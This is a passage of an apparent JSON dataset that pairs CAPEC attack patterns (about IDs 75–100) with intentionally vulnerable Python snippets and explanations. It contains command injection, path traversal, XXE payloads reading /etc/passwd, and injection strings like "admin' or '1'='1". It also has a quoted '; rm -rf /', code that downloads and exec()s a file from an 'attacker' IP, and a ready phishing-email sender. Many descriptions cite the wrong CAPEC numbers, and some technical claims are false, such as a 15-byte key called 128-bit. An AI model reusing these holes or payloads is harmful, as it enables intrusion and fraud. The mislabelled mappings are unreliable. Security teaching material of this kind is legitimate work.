        "code_snippet": "import os\n\n# Configuration file path\nconfig_file_path = 'config.txt'\n\n# Function to read configuration\ndef read_config(file_path):\n    with open(file_path, 'r') as file:\n        return file.read()\n\n# Function to execute a command based on configuration\ndef execute_command(config):\n    # CWE-77: Command Injection vulnerability\n    os.system(config)\n\n# Main function\nif __name__ == '__main__':\n    # CWE-346: Origin Validation Error - No validation of the source of the configuration file\n    config_data = read_config(config_file_path)\n    \n    # CWE-349: Acceptance of Extraneous Untrusted Data With Trusted Data\n    # CWE-99: Improper Control of Resource Identifiers\n    # CWE-353: Missing Support for Integrity Check\n    # CWE-354: Improper Validation of Integrity Check Value\n    # No validation or integrity check of the configuration data\n    execute_command(config_data)\n",
        "description": "This Python code snippet demonstrates a vulnerable application that reads a configuration file and executes a command based on its content. The main idea of the CAPEC is represented by the ability of an attacker to manipulate a writable configuration file to gain unauthorized access or control over the application. The code includes several CWE-related vulnerabilities: CWE-77 (Command Injection) by directly executing the configuration content as a system command, CWE-346 (Origin Validation Error) by not validating the source of the configuration file, CWE-349 (Acceptance of Extraneous Untrusted Data With Trusted Data) and CWE-99 (Improper Control of Resource Identifiers) by not distinguishing between trusted and untrusted data in the configuration, and CWE-353 and CWE-354 by not performing any integrity checks on the configuration data."
    },
    {
        "capec_id": "76",
        "capec_name": "Manipulating Web Input to File System Calls",
        "code_snippet": "import os\nfrom flask import Flask, request, send_file\n\napp = Flask(__name__)\n\n@app.route('/download', methods=['GET'])\ndef download_file():\n    filename = request.args.get('file')\n    if not filename:\n        return 'No file specified', 400\n    try:\n        # Vulnerable to Path Traversal\n        file_path = os.path.join('/var/www/files', filename)\n        return send_file(file_path)\n    except Exception as e:\n        return str(e), 500\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet represents a vulnerable web application using Flask. The application has a '/download' endpoint that allows users to download files from the server. The filename is taken directly from the user input (query parameter 'file') and concatenated with a base directory path ('/var/www/files'). This approach is vulnerable to Path Traversal (CWE-22, CWE-23) because it does not properly neutralize special elements like '..' in the user input, allowing an attacker to access files outside the intended directory. The code also demonstrates External Control of File Name or Path (CWE-73) by allowing user input to influence the file path used in filesystem operations."
    },
    {
        "capec_id": "77",
        "capec_name": "Manipulating User-Controlled Variables",
        "code_snippet": "import os\n\ndef set_debug_mode(query_params):\n    if 'DEBUG' in query_params:\n        os.environ['DEBUG'] = query_params['DEBUG']\n\n# Simulating user input\nuser_input = {'DEBUG': '1'}\nset_debug_mode(user_input)\n\n# Check if debug mode is set\nif os.getenv('DEBUG') == '1':\n    print('Debug mode is enabled')\nelse:\n    print('Debug mode is disabled')",
        "description": "This Python code snippet demonstrates a vulnerability where user-controlled variables can manipulate system settings. The function `set_debug_mode` takes a dictionary of query parameters and sets the environment variable 'DEBUG' based on user input without any validation or sanitization. This embodies the CAPEC concept of 'Manipulating User-Controlled Variables' and highlights CWE-15 (External Control of System or Configuration Setting) and CWE-473 (PHP External Variable Modification). The code shows how an attacker can enable debug mode by simply providing a specific query parameter, potentially exposing sensitive information or altering the application's behavior."
    },
    {
        "capec_id": "78",
        "capec_name": "Using Escaped Slashes in Alternate Encoding",
        "code_snippet": "import os\n\ndef read_file(file_path):\n    # Validate input before canonicalization (CWE-180)\n    if not file_path.startswith('/safe/directory/'):\n        raise ValueError('Invalid file path')\n    \n    # Canonicalize the path\n    canonical_path = os.path.realpath(file_path)\n    \n    # Validate the canonicalized path\n    if not canonical_path.startswith('/safe/directory/'):\n        raise ValueError('Invalid file path after canonicalization')\n    \n    # Read the file\n    with open(canonical_path, 'r') as file:\n        return file.read()\n\n# Example usage\nuser_input = '../etc/passwd'  # This input attempts a path traversal attack\ntry:\n    content = read_file(user_input)\n    print(content)\nexcept ValueError as e:\n    print(e)",
        "description": "This Python code snippet demonstrates a vulnerability related to the CAPEC 'Using Escaped Slashes in Alternate Encoding' and associated CWEs. The function `read_file` is intended to read a file from a specified path. It first attempts to validate the input path before canonicalizing it (CWE-180). However, this initial validation can be bypassed if the input uses alternate encoding or special characters (e.g., '../' for path traversal). After canonicalizing the path using `os.path.realpath`, it performs a second validation to ensure the path is within a restricted directory. This approach aims to prevent path traversal attacks (CWE-22) and improper handling of alternate encodings (CWE-173). The example usage shows how an attacker might attempt to exploit this by providing a path that escapes the intended directory, demonstrating the importance of proper input validation and canonicalization order."
    },
    {
        "capec_id": "79",
        "capec_name": "Using Slashes in Alternate Encoding",
        "code_snippet": "import os\n\n# Function to read a file based on user input\n# CWE-73: External Control of File Name or Path\n# CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\ndef read_file(user_input):\n    # CWE-20: Improper Input Validation\n    if not isinstance(user_input, str):\n        raise ValueError('Invalid input type')\n\n    # CWE-180: Incorrect Behavior Order: Validate Before Canonicalize\n    # CWE-181: Incorrect Behavior Order: Validate Before Filter\n    # CWE-173: Improper Handling of Alternate Encoding\n    # Attempt to normalize the path\n    normalized_path = os.path.normpath(user_input)\n\n    # CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')\n    # CWE-707: Improper Neutralization\n    if '..' in normalized_path or normalized_path.startswith('/') or normalized_path.startswith('\\\\'):\n        raise ValueError('Invalid path')\n\n    # Attempt to open the file\n    try:\n        with open(normalized_path, 'r') as file:\n            return file.read()\n    except FileNotFoundError:\n        return 'File not found'\n    except Exception as e:\n        return str(e)\n\n# Example usage\nuser_input = '../etc/passwd'  # This input should be rejected\ndata = read_file(user_input)\nprint(data)",
        "description": "This Python code snippet demonstrates a vulnerable file reading function that embodies the main idea of CAPEC-147: Using Slashes in Alternate Encoding. The function `read_file` takes user input to determine the file path to read. It attempts to normalize the path using `os.path.normpath`, but it does not properly handle alternate encodings or ensure the path is within a restricted directory. This can lead to CWE-22 (Path Traversal) and CWE-73 (External Control of File Name or Path) vulnerabilities. The code also highlights issues related to improper input validation (CWE-20), incorrect behavior order (CWE-180, CWE-181), and improper neutralization (CWE-74, CWE-707). The example usage shows how an attacker might exploit this by providing a path that attempts to access sensitive files outside the intended directory."
    },
    {
        "capec_id": "80",
        "capec_name": "Using UTF-8 Encoding to Bypass Validation Logic",
        "code_snippet": "import re\n\ndef is_valid_input(user_input):\n    # Validate input using a regex pattern\n    pattern = re.compile(r'^[a-zA-Z0-9]+$')\n    if pattern.match(user_input):\n        return True\n    return False\n\n# Example of a naive decoder that accepts overlong UTF-8 sequences\ndef naive_utf8_decoder(input_bytes):\n    try:\n        return input_bytes.decode('utf-8')\n    except UnicodeDecodeError:\n        return None\n\n# User input containing overlong UTF-8 sequence for '/'\noverlong_utf8_input = b'\\xc0\\xaf'\n\n# Validate the input before decoding\nif is_valid_input(overlong_utf8_input.decode('utf-8', errors='ignore')):\n    decoded_input = naive_utf8_decoder(overlong_utf8_input)\n    if decoded_input:\n        print(f\"Valid input: {decoded_input}\")\n    else:\n        print(\"Invalid UTF-8 sequence\")\nelse:\n    print(\"Invalid input format\")",
        "description": "This Python code snippet demonstrates a vulnerability where UTF-8 encoding is used to bypass validation logic. The `is_valid_input` function validates user input using a regex pattern that only allows alphanumeric characters. However, the input is validated before it is properly decoded, which can lead to security issues. The `naive_utf8_decoder` function is an example of a decoder that accepts overlong UTF-8 sequences, which can be exploited. The `overlong_utf8_input` variable contains an overlong UTF-8 sequence for the '/' character. The code attempts to validate this input before decoding it, which can result in bypassing the validation logic and potentially leading to security vulnerabilities such as injection attacks."
    },
    {
        "capec_id": "81",
        "capec_name": "Web Server Logs Tampering",
        "code_snippet": "import logging\nfrom flask import Flask, request\n\napp = Flask(__name__)\n\n# Setup logging\nlogging.basicConfig(filename='webserver.log', level=logging.INFO)\n\n@app.route('/submit', methods=['POST'])\ndef submit():\n    user_input = request.form['user_input']\n    # Vulnerable logging: does not neutralize special characters\n    logging.info(f'User input: {user_input}')\n    return 'Input received'\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet sets up a basic Flask web server with a single endpoint '/submit' that accepts POST requests. The user input from the request is logged directly to a file named 'webserver.log' without any sanitization or neutralization of special characters. This represents the CAPEC 'Web Server Logs Tampering' by demonstrating how an attacker could inject malicious data into the logs. The related CWEs are embodied in the code as follows:\n- CWE-117: The code does not neutralize special characters in the user input before logging it.\n- CWE-93: The code does not handle CRLF sequences, allowing potential log injection.\n- CWE-75: The code does not filter user input for special elements.\n- CWE-20: The code does not validate the user input.\n- CWE-150: The code does not neutralize escape, meta, or control sequences in the user input.\nThis code is vulnerable to log tampering attacks, which could be used to mask other malicious activities or exploit log processing systems."
    },
    {
        "capec_id": "82",
        "capec_name": "DEPRECATED: Violating Implicit Assumptions Regarding XML Content (aka XML Denial of Service (XDoS))",
        "code_snippet": "import xml.etree.ElementTree as ET\n\n# Vulnerable XML data (potentially from an untrusted source)\nxml_data = '''\n<!DOCTYPE root [\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n<root>\n  <data>&xxe;</data>\n</root>\n'''\n\ntry:\n    # Parse the XML data without proper validation\n    tree = ET.ElementTree(ET.fromstring(xml_data))\n    root = tree.getroot()\n    print(root.find('data').text)\nexcept ET.ParseError as e:\n    print(f\"XML parsing error: {e}\")",
        "description": "This Python code snippet demonstrates a vulnerability related to improper handling of XML data, specifically CWE-611 (Improper Restriction of XML External Entity Reference). The code parses XML data that includes an external entity reference, which can lead to XML External Entity (XXE) attacks. The XML data contains a DOCTYPE declaration with an entity that references a local file ('/etc/passwd'). When the XML is parsed, the entity is expanded, potentially exposing sensitive information. This example highlights the importance of validating and securely processing XML data to prevent such vulnerabilities."
    },
    {
        "capec_id": "83",
        "capec_name": "XPath Injection",
        "code_snippet": "import xml.etree.ElementTree as ET\n\ndef authenticate_user(username, password):\n    # Simulated XML data\n    xml_data = '''\n    <users>\n        <user>\n            <username>admin</username>\n            <password>admin123</password>\n        </user>\n        <user>\n            <username>user</username>\n            <password>user123</password>\n        </user>\n    </users>\n    '''\n\n    # Parse the XML data\n    tree = ET.ElementTree(ET.fromstring(xml_data))\n    root = tree.getroot()\n\n    # Construct XPath expression using user input (vulnerable to injection)\n    xpath_expr = f\".//user[username='{username}' and password='{password}']\"\n    user = root.find(xpath_expr)\n\n    if user is not None:\n        return \"Authentication successful\"\n    else:\n        return \"Authentication failed\"\n\n# Example usage\nprint(authenticate_user(\"admin' or '1'='1\", \"password\"))",
        "description": "This Python code snippet demonstrates an XPath Injection vulnerability. The `authenticate_user` function takes a username and password as input and constructs an XPath expression to query an XML database for matching user credentials. The user input is directly embedded into the XPath expression without proper sanitization, making it vulnerable to injection attacks. An attacker can manipulate the input to bypass authentication, as shown in the example usage where the input `\"admin' or '1'='1\"` exploits the vulnerability to always return a successful authentication. This code embodies the main idea of CAPEC-91 and related CWEs, highlighting the risks of improper input validation and neutralization in dynamic XPath expressions."
    },
    {
        "capec_id": "84",
        "capec_name": "XQuery Injection",
        "code_snippet": "import lxml.etree as ET\n\n# User input that is not properly sanitized\nuser_input = \"' or '1'='1\"\n\n# Constructing an XQuery expression using unsanitized user input\nxquery = f\"/users/user[username='{user_input}']\"\n\n# Load XML data\nxml_data = '''\n<users>\n    <user>\n        <username>admin</username>\n        <password>admin123</password>\n    </user>\n    <user>\n        <username>guest</username>\n        <password>guest123</password>\n    </user>\n</users>\n'''\n\ndoc = ET.fromstring(xml_data)\n\n# Execute the XQuery expression\nresult = doc.xpath(xquery)\n\n# Print the result\nfor user in result:\n    print(ET.tostring(user))",
        "description": "This Python code snippet demonstrates an XQuery Injection vulnerability. The code constructs an XQuery expression using unsanitized user input, which can be exploited by an attacker to manipulate the query. In this example, the user input is designed to always return true (' or '1'='1'), allowing the attacker to retrieve all user elements from the XML data. This represents the main idea of CAPEC-74, where improper neutralization of special elements in input data can lead to injection attacks. The related CWEs provide additional context on the types of improper neutralization that can occur in different scenarios, such as SQL Injection (CWE-89) and XPath Injection (CWE-643)."
    },
    {
        "capec_id": "85",
        "capec_name": "AJAX Footprinting",
        "code_snippet": "import requests\nfrom flask import Flask, request, jsonify\n\napp = Flask(__name__)\n\n@app.route('/search', methods=['GET'])\ndef search():\n    query = request.args.get('query')\n    if not query:\n        return jsonify({'error': 'No query provided'}), 400\n    # CWE-20: Improper Input Validation\n    if '<script>' in query:\n        return jsonify({'error': 'Invalid input'}), 400\n    # CWE-116: Improper Encoding or Escaping of Output\n    response = f\"<div>Search results for: {query}</div>\"\n    return response\n\n@app.route('/ajax', methods=['POST'])\ndef ajax():\n    data = request.json\n    if not data or 'url' not in data:\n        return jsonify({'error': 'Invalid data'}), 400\n    # CWE-348: Use of Less Trusted Source\n    url = data['url']\n    try:\n        # CWE-79: Cross-site Scripting (XSS)\n        external_response = requests.get(url)\n        return jsonify({'content': external_response.text})\n    except requests.RequestException as e:\n        return jsonify({'error': str(e)}), 500\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a simple Flask web application with two endpoints: '/search' and '/ajax'. The '/search' endpoint takes a query parameter and returns a search result. It includes basic input validation to prevent XSS attacks (CWE-20) and improper encoding/escaping of output (CWE-116). The '/ajax' endpoint accepts a JSON payload with a URL, fetches content from the URL, and returns it. This endpoint highlights the use of a less trusted source (CWE-348) and potential XSS vulnerabilities (CWE-79) by directly including external content in the response. The code embodies the main idea of AJAX Footprinting by demonstrating how frequent client-server interactions can be exploited to gather information and identify vulnerabilities."
    },
    {
        "capec_id": "86",
        "capec_name": "XSS Through HTTP Headers",
        "code_snippet": "from flask import Flask, request, make_response\n\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    user_agent = request.headers.get('User-Agent')\n    response = make_response(f'<html><body><h1>Welcome!</h1><p>Your user agent is: {user_agent}</p></body></html>')\n    return response\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to create a simple web application that reads the 'User-Agent' HTTP header from incoming requests and includes it in the HTML response without proper validation or sanitization. This embodies the main idea of the CAPEC 'XSS Through HTTP Headers' by demonstrating how an attacker could inject malicious scripts through HTTP headers. The related CWEs highlight the improper neutralization of script-related HTML tags (CWE-80), improper neutralization of input during web page generation (CWE-79), and improper neutralization of HTTP headers for scripting syntax (CWE-644). The code is vulnerable to XSS attacks because it directly includes user-controllable input in the HTML output without any sanitization."
    },
    {
        "capec_id": "87",
        "capec_name": "Forceful Browsing",
        "code_snippet": "from flask import Flask, request, redirect, url_for\n\napp = Flask(__name__)\n\n# Simulated user roles\nuser_roles = {\n    'user1': 'admin',\n    'user2': 'user'\n}\n\n# Simulated session\nsession = {\n    'username': 'user2'\n}\n\n@app.route('/admin')\ndef admin_panel():\n    if session['username'] not in user_roles or user_roles[session['username']] != 'admin':\n        return 'Access Denied', 403\n    return 'Welcome to the admin panel'\n\n@app.route('/admin/settings')\ndef admin_settings():\n    # Missing authorization check\n    return 'Admin settings page'\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to demonstrate a vulnerability related to 'Forceful Browsing' (CAPEC-111). The code defines two routes: '/admin' and '/admin/settings'. The '/admin' route correctly checks if the user has the 'admin' role before granting access. However, the '/admin/settings' route lacks an authorization check, allowing any authenticated user to access it directly by entering the URL. This represents CWE-425 (Direct Request), CWE-285 (Improper Authorization), and CWE-693 (Protection Mechanism Failure). The code highlights the importance of enforcing authorization checks on all restricted URLs to prevent unauthorized access."
    },
    {
        "capec_id": "88",
        "capec_name": "OS Command Injection",
        "code_snippet": "import os\n\ndef execute_command(user_input):\n    # Vulnerable to OS Command Injection\n    command = f'ls {user_input}'\n    os.system(command)\n\nuser_input = input('Enter directory name: ')\nexecute_command(user_input)",
        "description": "This Python code snippet demonstrates a basic example of OS Command Injection vulnerability. The function `execute_command` takes user input and constructs an OS command string without proper validation or neutralization of special elements. The `os.system` function then executes this command. An attacker can exploit this by providing malicious input, such as `; rm -rf /`, to execute arbitrary commands on the underlying operating system. This example embodies the main idea of CAPEC-88 and related CWEs, particularly CWE-78 (Improper Neutralization of Special Elements used in an OS Command) and CWE-20 (Improper Input Validation)."
    },
    {
        "capec_id": "89",
        "capec_name": "Pharming",
        "code_snippet": "import socket\nimport requests\n\n# CWE-350: Reliance on Reverse DNS Resolution for a Security-Critical Action\nhostname = 'trustedbank.com'\nip_address = socket.gethostbyname(hostname)\n\n# CWE-346: Origin Validation Error\nif ip_address == '192.168.1.100':  # Attacker's IP\n    print('Access granted to trusted site')\n    # CWE-602: Client-Side Enforcement of Server-Side Security\n    response = requests.get(f'http://{ip_address}/login')\n    if '<script>' in response.text:  # CWE-79: Cross-site Scripting\n        print('Potential XSS detected')\n    else:\n        print('No XSS detected')\nelse:\n    print('Access denied')\n\n# CWE-494: Download of Code Without Integrity Check\ncode = requests.get('http://192.168.1.100/malicious_code.py').text\nexec(code)",
        "description": "This Python code snippet demonstrates a scenario where a pharming attack can occur due to several security weaknesses. The code first resolves the IP address of a supposedly trusted hostname ('trustedbank.com') using reverse DNS resolution (CWE-350). It then checks if the resolved IP address matches a known trusted IP, but this check is flawed (CWE-346), allowing an attacker to spoof the IP address. The code proceeds to make a request to the potentially malicious site and performs a client-side check for XSS vulnerabilities (CWE-602 and CWE-79). Finally, it downloads and executes code from the remote location without verifying its integrity (CWE-494). This demonstrates how an attacker can redirect a victim to a malicious site and execute arbitrary code, embodying the main idea of a pharming attack."
    },
    {
        "capec_id": "90",
        "capec_name": "Reflection Attack in Authentication Protocol",
        "code_snippet": "import socket\n\n# Simple challenge-response authentication protocol\nclass AuthServer:\n    def __init__(self, secret_key):\n        self.secret_key = secret_key\n\n    def challenge(self, client_message):\n        # Incorrect implementation: directly reflects the challenge\n        return client_message\n\n    def authenticate(self, client_response):\n        # Incorrectly assumes client response is valid if it matches the secret key\n        return client_response == self.secret_key\n\n# Simulated client\nclass AuthClient:\n    def __init__(self, secret_key):\n        self.secret_key = secret_key\n\n    def respond_to_challenge(self, challenge):\n        # Incorrectly responds with the secret key\n        return self.secret_key\n\n# Simulated attacker\nclass Attacker:\n    def reflection_attack(self, server, client_message):\n        # Reflects the challenge back to the server\n        challenge = server.challenge(client_message)\n        return server.authenticate(challenge)\n\n# Example usage\nsecret_key = 'supersecret'\nserver = AuthServer(secret_key)\nclient = AuthClient(secret_key)\nattacker = Attacker()\n\n# Attacker performs reflection attack\nclient_message = 'HelloServer'\nif attacker.reflection_attack(server, client_message):\n    print('Attack successful: Access granted')\nelse:\n    print('Attack failed: Access denied')",
        "description": "This Python code snippet demonstrates a reflection attack on a simple challenge-response authentication protocol. The AuthServer class has a challenge method that incorrectly reflects the client's message back as the challenge, and an authenticate method that incorrectly assumes the client response is valid if it matches the secret key. The AuthClient class responds to the challenge with the secret key, which is also incorrect. The Attacker class performs a reflection attack by sending the client's message to the server and reflecting the challenge back to the server, which results in successful authentication. This code embodies the main idea of CAPEC-301 (Reflection Attack in Authentication Protocol) and highlights related weaknesses such as incorrect implementation of the authentication algorithm (CWE-303) and authentication bypass by spoofing (CWE-290)."
    },
    {
        "capec_id": "91",
        "capec_name": "DEPRECATED: XSS in IMG Tags",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/display', methods=['GET'])\ndef display():\n    user_input = request.args.get('input', '')\n    # Vulnerable code: directly embedding user input in an IMG tag without proper neutralization\n    html_content = f'<img src=\"{user_input}\" />'\n    return render_template_string(html_content)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a basic Flask web application that is vulnerable to Cross-Site Scripting (XSS) attacks through the improper neutralization of script in attributes of IMG tags (CWE-82). The application takes user input from a query parameter and directly embeds it into an IMG tag's src attribute without proper sanitization or escaping. This can allow an attacker to inject malicious scripts, leading to XSS attacks. The code represents the main idea of the deprecated CAPEC pattern 'XSS in IMG Tags' and highlights the associated weaknesses, such as improper neutralization of script-related HTML tags (CWE-80) and incomplete denylist-based protection (CWE-692)."
    },
    {
        "capec_id": "92",
        "capec_name": "Forced Integer Overflow",
        "code_snippet": "import sys\n\n# Function to simulate forced integer overflow\n\ndef allocate_memory(size):\n    # CWE-190: Integer Overflow or Wraparound\n    if size < 0:\n        raise ValueError(\"Size must be non-negative\")\n    \n    # Simulate integer overflow by forcing size to wrap around\n    max_int = sys.maxsize\n    if size > max_int:\n        size = size - (max_int + 1)\n    \n    # CWE-680: Integer Overflow to Buffer Overflow\n    buffer = [0] * size  # This can lead to a buffer overflow if size is incorrect\n    return buffer\n\n# Example usage\ntry:\n    # This will cause an integer overflow\n    buffer = allocate_memory(sys.maxsize + 1)\n    print(\"Buffer allocated with size:\", len(buffer))\nexcept Exception as e:\n    print(\"Error:\", e)\n",
        "description": "This Python code snippet demonstrates a forced integer overflow scenario. The `allocate_memory` function takes a size parameter and attempts to allocate a buffer of that size. If the size exceeds the maximum integer value (`sys.maxsize`), it wraps around to a smaller value, simulating an integer overflow (CWE-190). This can lead to a buffer overflow (CWE-680) when the buffer is allocated with an incorrect size. The example usage shows how an integer overflow can occur when trying to allocate a buffer with a size of `sys.maxsize + 1`, leading to unexpected behavior."
    },
    {
        "capec_id": "93",
        "capec_name": "Log Injection-Tampering-Forging",
        "code_snippet": "import logging\n\n# Setup logging\nlogging.basicConfig(filename='app.log', level=logging.INFO)\n\n# Function to log user input\ndef log_user_action(user_input):\n    # CWE-117: Improper Output Neutralization for Logs\n    # CWE-75: Failure to Sanitize Special Elements into a Different Plane\n    # CWE-150: Improper Neutralization of Escape, Meta, or Control Sequences\n    logging.info(f'User action: {user_input}')\n\n# Example of user input that could be malicious\nuser_input = \"User logged in; DROP TABLE users; --\"\nlog_user_action(user_input)\n\n# CWE-532: Insertion of Sensitive Information into Log File\n# CWE-779: Logging of Excessive Data\nsensitive_info = \"User password: secret_password\"\nlogging.info(f'Sensitive info: {sensitive_info}')",
        "description": "This Python code snippet demonstrates a logging mechanism that is vulnerable to log injection, tampering, and forging attacks. The `log_user_action` function logs user input directly without proper sanitization or neutralization, making it susceptible to CWE-117, CWE-75, and CWE-150. Additionally, sensitive information is logged directly (CWE-532), and excessive data logging is shown (CWE-779). This code highlights the risks of improper log handling and the potential for malicious manipulation of log files."
    },
    {
        "capec_id": "94",
        "capec_name": "Adversary in the Middle (AiTM)",
        "code_snippet": "import socket\nimport ssl\n\n# Create a context with improper SSL settings\ncontext = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)\ncontext.verify_mode = ssl.CERT_NONE  # CWE-287: Improper Authentication\n\n# Create a socket and wrap it with SSL\nserver_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver_socket.bind(('localhost', 8443))\nserver_socket.listen(5)\n\n# Accept a connection\nclient_socket, addr = server_socket.accept()\nssl_socket = context.wrap_socket(client_socket, server_side=True)\n\n# CWE-593: Modify SSL context after connection creation\ncontext.verify_mode = ssl.CERT_OPTIONAL\n\n# Read data from the client\ntry:\n    data = ssl_socket.recv(1024)\n    print(f'Received: {data}')\n    # CWE-294: Replay attack vulnerability\n    ssl_socket.send(data)  # Echo back the received data\nfinally:\n    ssl_socket.close()\n    server_socket.close()",
        "description": "This Python code snippet demonstrates a vulnerable server setup that embodies the 'Adversary in the Middle (AiTM)' attack pattern. The server uses an SSL context with improper authentication settings (CWE-287), allowing connections without verifying client certificates. After accepting a connection, the SSL context is modified (CWE-593), which can lead to security issues. The server then reads data from the client and echoes it back, illustrating a potential replay attack vulnerability (CWE-294). This setup can be exploited by an adversary to intercept and manipulate communication between the client and server."
    },
    {
        "capec_id": "95",
        "capec_name": "WSDL Scanning",
        "code_snippet": "import requests\n\n# URL of the WSDL file\nwsdl_url = 'http://example.com/service?wsdl'\n\n# Function to scan WSDL file\ndef scan_wsdl(url):\n    try:\n        response = requests.get(url)\n        if response.status_code == 200:\n            wsdl_content = response.text\n            print('WSDL Content Retrieved:')\n            print(wsdl_content)\n            # Example of extracting sensitive information\n            if 'password' in wsdl_content or 'secret' in wsdl_content:\n                print('Sensitive information found in WSDL file!')\n        else:\n            print('Failed to retrieve WSDL file')\n    except Exception as e:\n        print(f'Error occurred: {e}')\n\n# Scan the WSDL file\nscan_wsdl(wsdl_url)",
        "description": "This Python code snippet demonstrates a basic WSDL scanning attack. The script sends an HTTP GET request to retrieve the WSDL file from a specified URL. If the WSDL file is successfully retrieved, the content is printed, and a simple check is performed to identify if any sensitive information (like 'password' or 'secret') is present in the WSDL content. This embodies the main idea of CAPEC-111 (WSDL Scanning) by showing how an attacker might probe a WSDL interface to reveal sensitive information. The related CWEs are represented by the potential exposure of sensitive information within the WSDL file (CWE-651) and the use of GET requests to access this information (CWE-598)."
    },
    {
        "capec_id": "96",
        "capec_name": "Block Access to Libraries",
        "code_snippet": "import os\n\ntry:\n    # Attempt to use a third-party library function\n    import some_third_party_lib\n    some_third_party_lib.some_function()\nexcept ImportError as e:\n    print(\"Error: Required library is not available.\")\n    # Fallback to an alternative method or handle the error\n    try:\n        # Attempt to use an OS-specific API as a fallback\n        if os.name == 'posix':\n            os.system('some_posix_command')\n        elif os.name == 'nt':\n            os.system('some_windows_command')\n        else:\n            raise OSError(\"Unsupported OS\")\n    except OSError as oe:\n        print(\"Critical Error: Unable to perform required operation.\")\n        # Handle the critical error, possibly leaving the system in an insecure state\n        exit(1)\n\n# Further code execution\nprint(\"Continuing execution...\")",
        "description": "This Python code snippet demonstrates the CAPEC concept of 'Block Access to Libraries' by attempting to import and use a third-party library. If the library is unavailable (ImportError), it falls back to using an OS-specific API, which may not be available on all platforms (CWE-589). The code also includes error handling for unsupported OS types, which could lead to a critical error and potentially leave the system in an insecure state. This example highlights the risks associated with relying on external libraries and APIs, and the potential security implications when they are not properly handled."
    },
    {
        "capec_id": "97",
        "capec_name": "Cryptanalysis",
        "code_snippet": "import os\nfrom Crypto.Cipher import AES\nfrom Crypto.Util.Padding import pad, unpad\n\n# Use of a weak key (CWE-327)\nkey = b'weakkey12345678'  # 128-bit key\n\n# Use of a predictable IV (CWE-1204)\niv = b'0000000000000000'  # 16 bytes IV\n\ncipher = AES.new(key, AES.MODE_CBC, iv)\n\n# Encrypting data\nplaintext = b'This is a secret message'\nciphertext = cipher.encrypt(pad(plaintext, AES.block_size))\nprint(f'Ciphertext: {ciphertext.hex()}')\n\n# Decrypting data\ncipher = AES.new(key, AES.MODE_CBC, iv)\ndecrypted = unpad(cipher.decrypt(ciphertext), AES.block_size)\nprint(f'Decrypted: {decrypted.decode()}')",
        "description": "This Python code snippet demonstrates the concept of cryptanalysis by using weak cryptographic practices. It uses a weak key (CWE-327) and a predictable initialization vector (IV) (CWE-1204) for AES encryption in CBC mode. The weak key and predictable IV make the encryption vulnerable to attacks, allowing an attacker to potentially decipher the ciphertext without knowing the secret key. This embodies the main idea of CAPEC-189 (Cryptanalysis), where weaknesses in the cryptographic implementation can be exploited to break the encryption."
    },
    {
        "capec_id": "98",
        "capec_name": "Phishing",
        "code_snippet": "import smtplib\nfrom email.mime.text import MIMEText\n\n# CWE-601: URL Redirection to Untrusted Site\nphishing_url = 'http://malicious-site.com/login'\n\n# CWE-451: UI Misrepresentation of Critical Information\nemail_body = f\"\"\"\nDear User,\n\nWe have detected unusual activity on your account. Please click the link below to verify your identity:\n\n<a href='{phishing_url}'>Verify Now</a>\n\nThank you,\nYour Trusted Service\n\"\"\"\n\n# CWE-506: Embedded Malicious Code\n# CWE-507: Trojan Horse\n# CWE-512: Spyware\n# Sending the phishing email\nmsg = MIMEText(email_body, 'html')\nmsg['Subject'] = 'Important: Verify Your Account'\nmsg['From'] = 'no-reply@trustedservice.com'\nmsg['To'] = 'victim@example.com'\n\ntry:\n    with smtplib.SMTP('smtp.example.com') as server:\n        server.sendmail(msg['From'], [msg['To']], msg.as_string())\n    print('Phishing email sent successfully.')\nexcept Exception as e:\n    print(f'Failed to send phishing email: {e}')",
        "description": "This Python code snippet demonstrates a phishing attack by sending a deceptive email to a victim. The email contains a link to a malicious site (CWE-601: URL Redirection to Untrusted Site) and misrepresents critical information (CWE-451: UI Misrepresentation of Critical Information) to trick the user into clicking the link. The email is crafted to appear as if it is from a trusted service, which is a common tactic in phishing attacks. The code also implicitly represents CWE-506 (Embedded Malicious Code), CWE-507 (Trojan Horse), and CWE-512 (Spyware) by the nature of the phishing attack, which aims to collect sensitive information from the user without their explicit consent."
    },
    {
        "capec_id": "99",
        "capec_name": "DEPRECATED: XML Parser Attack",
        "code_snippet": "import xml.etree.ElementTree as ET\n\n# Vulnerable XML data (could be from an untrusted source)\nxml_data = '''\n<!DOCTYPE foo [\n<!ELEMENT foo ANY >\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n<foo>&xxe;</foo>\n'''\n\ntry:\n    # Parsing the XML data without proper validation\n    tree = ET.ElementTree(ET.fromstring(xml_data))\n    root = tree.getroot()\n    print(ET.tostring(root, encoding='unicode'))\nexcept ET.ParseError as e:\n    print(f'Error parsing XML: {e}')",
        "description": "This Python code snippet demonstrates a vulnerability related to XML External Entity (XXE) attacks, which is a specific type of XML Parser Attack. The code uses the xml.etree.ElementTree module to parse XML data that includes an external entity reference. The XML data contains a DOCTYPE declaration that defines an entity 'xxe' which attempts to read the contents of the '/etc/passwd' file. The code does not validate or sanitize the XML input, making it susceptible to XXE attacks. This example highlights the importance of proper XML validation and the risks of processing XML from untrusted sources without adequate security measures."
    },
    {
        "capec_id": "100",
        "capec_name": "Overflow Buffers",
        "code_snippet": "import struct\n\ndef vulnerable_function(data):\n    buffer = bytearray(10)  # Fixed-size buffer\n    for i in range(len(data)):\n        buffer[i] = data[i]  # No bounds checking\n\n# Example usage\nuser_input = b'A' * 20  # Input larger than buffer size\nvulnerable_function(user_input)",
